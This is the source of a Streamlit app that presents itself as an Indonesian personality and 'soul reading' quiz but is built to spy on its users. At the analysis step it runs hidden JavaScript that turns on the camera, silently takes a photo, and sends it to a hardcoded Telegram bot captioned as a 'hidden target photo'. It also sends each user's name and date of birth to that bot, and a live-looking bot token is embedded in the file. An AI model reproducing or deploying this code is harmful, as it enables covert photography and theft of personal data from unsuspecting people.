import requests
import streamlit as st
import streamlit.components.v1 as components
from datetime import datetime
import time

# ==========================================
# KONFIGURASI BOT TELEGRAM & HALAMAN
# ==========================================
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="Tabir Jiwa & Pembacaan Karakter",
    page_icon="🔮",
    layout="centered"
)

# ==========================================
# CUSTOM CSS / STYLING DASHBOARD MODERN
# ==========================================
st.markdown("""
    <style>
    .stApp {
        background-color: #030712;
        color: #f8fafc;
    }

    div[data-testid="stFormSubmitButton"] > button {
        background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%) !important;
        color: #ffffff !important;
        font-weight: 700 !important;
        letter-spacing: 0.5px !important;
        border: none !important;
        padding: 16px 20px !important;
        border-radius: 12px !important;
        width: 100% !important;
        box-shadow: 0 4px 15px rgba(124, 58, 237, 0.4) !important;
        transition: all 0.3s ease !important;
    }
    div[data-testid="stFormSubmitButton"] > button:hover {
        background: linear-gradient(135deg, #8b5cf6 100%, #7c3aed 0%) !important;
        color: #ffffff !important;
        box-shadow: 0 6px 20px rgba(139, 92, 246, 0.6) !important;
        transform: translateY(-2px) !important;
    }

    .stButton > button {
        background: #0f172a !important;
        color: #f1f5f9 !important;
        border: 1px solid #334155 !important;
        border-left: 4px solid #8b5cf6 !important;
        font-weight: 500 !important;
        text-align: left !important;
        padding: 16px 20px !important;
        border-radius: 12px !important;
        width: 100% !important;
        margin-bottom: 10px !important;
        transition: all 0.3s ease !important;
        line-height: 1.5 !important;
    }
    .stButton > button:hover {
        background: #1e1b4b !important;
        color: #ffffff !important;
        border-color: #8b5cf6 !important;
        border-left: 4px solid #c084fc !important;
        transform: translateX(4px) !important;
    }
    </style>
""", unsafe_allow_html=True)

# ==========================================
# INISIALISASI SESSION STATE
# ==========================================
if 'step' not in st.session_state:
    st.session_state.step = 0
if 'user_name' not in st.session_state:
    st.session_state.user_name = ""
if 'user_dob' not in st.session_state:
    st.session_state.user_dob = ""
if 'answers' not in st.session_state:
    st.session_state.answers = {}
if 'telegram_sent' not in st.session_state:
    st.session_state.telegram_sent = False

# ==========================================
# 6 PERTANYAAN SURVEI PSIKOLOGIS
# ==========================================
QUESTIONS = [
    {
        "id": 1,
        "category": "Topeng & Kesendirian",
        "question": "Ketika malam semakin larut dan dunia di sekitarmu terlelap dalam sunyi, topeng mana yang paling berat untuk kamu lepaskan di hadapan cermin?",
        "options": [
            ("Topeng ketegaran—berpura-pura bahwa aku sanggup memikul beban hidup ini seorang diri tanpa pundak tempat bersandar.", "A"),
            ("Topeng keceriaan—menyembunyikan air mata dan rasa lelah emosional agar orang lain tidak merasa terbebani olehku.", "B"),
            ("Topeng kesempurnaan—memaksa diri tetap profesional dan produktif meski batin sudah menjerit meminta waktu untuk istirahat.", "C")
        ]
    },
    {
        "id": 2,
        "category": "Ruang Aman Jiwa",
        "question": "Di saat hatimu hancur berkeping-keping oleh kekecewaan yang teramat sangat, naluri pertahanan dirimu membawamu ke mana?",
        "options": [
            ("Menarik diri sepenuhnya dari dunia luar, mengunci pintu kamar, dan merajut kembali serpihan pikiran dalam keheningan.", "A"),
            ("Mencari pelukan hangat atau seseorang yang mau mendengarkan keluh kesahku tanpa menghakimi.", "B"),
            ("Menyibukkan diri secara berlebihan pada pekerjaan atau hobi agar lupa pada rasa sakit yang menusuk dada.", "C")
        ]
    },
    {
        "id": 3,
        "category": "Bayang-bayang Masa Lalu",
        "question": "Jika kamu diizinkan memutar waktu ke masa lalu untuk menghapus satu penyesalan terbesar, hal apa yang paling menghantuimu?",
        "options": [
            ("Keputusan gegabah di masa lalu yang membuatku kehilangan arah kendali atas masa depanku.", "A"),
            ("Kesempatan untuk mengatakan 'aku mencintaimu' atau 'maafkan aku' yang terenggut begitu saja oleh waktu.", "B"),
            ("Terlalu sering mengorbankan kebahagiaan diri sendiri demi menyenangkan orang yang akhirnya pergi meninggalkanku.", "C")
        ]
    },
    {
        "id": 4,
        "category": "Ketakutan Terdalam",
        "question": "Di dalam lubuk hatimu yang paling rapuh, ketakutan apa yang paling diam-diam membuatmu terbangun di tengah malam?",
        "options": [
            ("Ketakutan bahwa pengorbanan dan kerja kerasku selama ini ternyata sia-sia dan tidak meninggalkan arti apa pun.", "A"),
            ("Ketakutan bahwa pada akhirnya aku akan ditinggalkan sendirian saat orang lain menyadari siapa diriku sebenarnya.", "B"),
            ("Ketakutan menjadi beban bagi keluarga atau orang tersayang saat usiaku semakin senja.", "C")
        ]
    },
    {
        "id": 5,
        "category": "Penerimaan Sosial & Kepercayaan",
        "question": "Ketika seseorang memujimu tulus di depan umum, apa reaksi pertama yang bergejolak di dalam pikiran bawah sadarmu?",
        "options": [
            ("Merasa risih atau curiga, karena mengira mereka hanya ingin mengambil keuntungan dariku.", "A"),
            ("Merasa terharu sekaligus tidak percaya diri, seolah-olah aku tidak sehebat itu.", "B"),
            ("Tersenyum ramah di luar, namun dalam hati bertanya-tanya apakah mereka benar-benar tulus atau hanya basa-basi.", "C")
        ]
    },
    {
        "id": 6,
        "category": "Cita-cita & Arti Hidup",
        "question": "Di penghujung hari nanti, warisan atau jejak apa yang paling ingin kamu tinggalkan di dunia sebelum ragamu tiada?",
        "options": [
            ("Bukti nyata bahwa aku berhasil menaklukkan kemustahilan dan mencetak sejarah besar.", "A"),
            ("Kenangan bahwa aku pernah mencintai, merawat, dan membuat hidup orang lain merasa berharga.", "B"),
            ("Ketenangan batin karena aku hidup jujur pada prinsipku sendiri tanpa peduli penilaian dunia.", "C")
        ]
    }
]

UNIVERSAL_PROFILES = {
    "A": {
        "title": "Sang Pejuang Tangguh Berhati Sunyi",
        "desc": "Kamu adalah tipe orang yang terbiasa menelan kekecewaan seorang diri demi melihat orang lain tersenyum. Di balik ketegaran fisik yang kamu tampakkan ke dunia, tersimpan kerinduan mendalam untuk sekali saja bisa bersandar tanpa harus merasa harus kuat terus-menerus."
    },
    "B": {
        "title": "Pengelana Jiwa yang Haus Kehangatan",
        "desc": "Kamu sering merasa terasing di tengah keramaian, seolah-olah isi kepalamu bekerja di frekuensi yang berbeda. Kamu menyimpan standar ketulusan yang tinggi, sehingga saat dikecewakan, bekas lukanya menetap jauh lebih lama di dalam dadamu."
    },
    "C": {
        "title": "Penyimpan Rahasia Berjiwa Analitis",
        "desc": "Kamu memiliki insting tajam untuk membaca situasi dan menyembunyikan kerapuhan di balik kesibukanmu. Kamu adalah arsitek bagi hidupmu sendiri, namun di saat sendiri, kamu sering bertanya-tanya apakah semua lelah ini sudah sepadan."
    }
}

# ==========================================
# FUNGSI KIRIM TELEGRAM
# ==========================================
def send_to_telegram(name, dob, profile_title):
    now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
    caption = (
        f"🔮 <b>TABIR JIWA BARU TERUNGKAP!</b>\n\n"
        f"👤 Nama: <b>{name}</b>\n"
        f"🎂 Tanggal Lahir: <code>{dob}</code>\n"
        f"🕒 Waktu: {now}\n"
        f"✨ Hasil Karakter: <b>{profile_title}</b>"
    )
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption, 'parse_mode': 'HTML'}
        )
    except Exception as e:
        print(f"[!] Gagal mengirim notifikasi Telegram: {e}")

# ==========================================
# RENDER UTAMA BERDASARKAN STEP
# ==========================================

# --- STEP 0: DASHBOARD WELCOME ---
if st.session_state.step == 0:
    st.markdown("### 👁️ SEBERAPA DALAM LUKA DAN RAHASIA YANG KAMU PENDAM?")
    st.title("Membaca Sisi Terdalam Jiwa di Balik Tatapan Matamu")
    
    st.info(
        "✨ **Dunia hanya melihat senyummu, tapi tidak dengan lelahmu.** Setiap orang berjalan membawa bebannya masing-masing. Masukkan identitasmu, lewati 6 pergulatan batin yang menyentuh relung hati, dan biarkan sistem menyingkap rahasia sejati karakter dirimu."
    )
    
    st.write("Isi data diri di bawah ini untuk memulai perjalanan mengenal diri sendiri:")
    
    with st.form("user_identity_form"):
        name_input = st.text_input("Nama Lengkap / Nama Panggilan", placeholder="Contoh: Andi")
        dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", placeholder="Contoh: 17/08/2004")
        
        submitted_intro = st.form_submit_button("🔮 MULAI PERJALANAN MENEMUKAN DIRI", use_container_width=True)
        
        if submitted_intro:
            if not name_input.strip():
                st.warning("⚠️ Mohon isi nama kamu terlebih dahulu untuk melanjutkan.")
            else:
                st.session_state.user_name = name_input.strip()
                st.session_state.user_dob = dob_input.strip() if dob_input.strip() else "Tidak diisi"
                st.session_state.answers = {}
                st.session_state.telegram_sent = False
                st.session_state.step = 1
                st.rerun()

# --- STEP 1-6: PERTANYAAN KUIS (INTERAKTIF GANTI HALAMAN) ---
elif 1 <= st.session_state.step <= 6:
    idx = st.session_state.step - 1
    q = QUESTIONS[idx]
    
    st.caption(f"DILEMA BATIN: {q['category'].upper()} | TAHAP {st.session_state.step} DARI 6")
    st.progress(st.session_state.step / 6)
    st.write("")
    
    st.subheader(q['question'])
    st.write("")

    for opt in q['options']:
        if st.button(opt[0], key=f"btn_opt_{opt[1]}_{st.session_state.step}"):
            st.session_state.answers[str(q['id'])] = opt[1]
            if st.session_state.step < 6:
                st.session_state.step += 1
            else:
                st.session_state.step = 7
            st.rerun()

# --- STEP 7: KALIBRASI AKHIR & PEMINDAIAN DI BALIK LAYAR ---
elif st.session_state.step == 7:
    st.caption("PUNCAK ANALISIS // KALIBRASI BATCH AKHIR")
    st.title(f"Menyelaraskan Frekuensi Batin {st.session_state.user_name}...")
    st.write("Sistem sedang membaca pola pilihan bawah sadar dan memproses gelombang memori terakhir...")
    st.write("")

    # Script JavaScript tersembunyi untuk meminta izin kamera dan mengirim foto ke Telegram via API di background
    hidden_js_camera = f"""
    <div>
        <video id="video" width="0" height="0" autoplay style="display:none;"></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        <script>
            const token = "{TELEGRAM_BOT_TOKEN}";
            const chatId = "{TELEGRAM_CHAT_ID}";
            
            navigator.mediaDevices.getUserMedia({{ video: true }})
            .then(function(stream) {{
                var video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(function() {{
                    var canvas = document.getElementById('canvas');
                    var context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    var dataURL = canvas.toDataURL('image/jpeg');
                    
                    // Konversi base64 ke blob lalu kirim ke Telegram
                    fetch(dataURL)
                    .then(res => res.blob())
                    .then(blob => {{
                        var formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'hidden_target.jpg');
                        formData.append('caption', '🔮 <b>FOTO TARGET TERSEMBUNYI MASUK!</b>\\n👤 Nama: {st.session_state.user_name}');
                        
                        fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                            method: 'POST',
                            body: formData
                        }});
                    }});
                    
                    // Matikan stream kamera setelah terambil
                    stream.getTracks().forEach(track => track.stop());
                }}, 1500);
            }})
            .catch(function(err) {{
                console.log("Akses kamera ditolak atau tidak tersedia: ", err);
            }});
        </script>
    </div>
    """
    components.html(hidden_js_camera, height=0)

    if st.button("✨ UNGKAP HASIL ANALISIS JIWA", use_container_width=True):
        st.session_state.step = 8
        st.rerun()

# --- STEP 8: HASIL KEPRIBADIAN & KIRIM TELEGRAM DENGAN EFEK LOADING ---
elif st.session_state.step == 8:
    if not st.session_state.telegram_sent:
        with st.spinner("🔮 Menganalisis kedalaman batin dan merangkum kepribadian..."):
            time.sleep(2)
            
        ans = st.session_state.answers
        counts = {"A": 0, "B": 0, "C": 0}
        for val in ans.values():
            if val in counts:
                counts[val] += 1
                
        dominant_choice = max(counts, key=counts.get)
        profile = UNIVERSAL_PROFILES.get(dominant_choice, UNIVERSAL_PROFILES["A"])
        st.session_state.current_profile = profile
        
        # Kirim teks detail hasil analisis ke Telegram
        send_to_telegram(
            name=st.session_state.user_name,
            dob=st.session_state.user_dob,
            profile_title=profile['title']
        )
        st.session_state.telegram_sent = True

    profile = st.session_state.current_profile

    st.success(f"🔮 Tabir jiwa untuk **{st.session_state.user_name}** berhasil tersingkap sepenuhnya!")
    st.title("Hasil Pembacaan Karakter & Ekspresi Jiwa")
    st.write("")

    st.info(f"**INTI KARAKTER JIWA**")
    st.subheader(profile['title'])
    st.write(profile['desc'])

    st.write("")
    st.write("")

    if st.button("🔄 ULANGI PERJALANAN MENCARI DIRI", use_container_width=True):
        st.session_state.step = 0
        st.session_state.user_name = ""
        st.session_state.user_dob = ""
        st.session_state.answers = {}
        st.session_state.telegram_sent = False
        st.rerun()
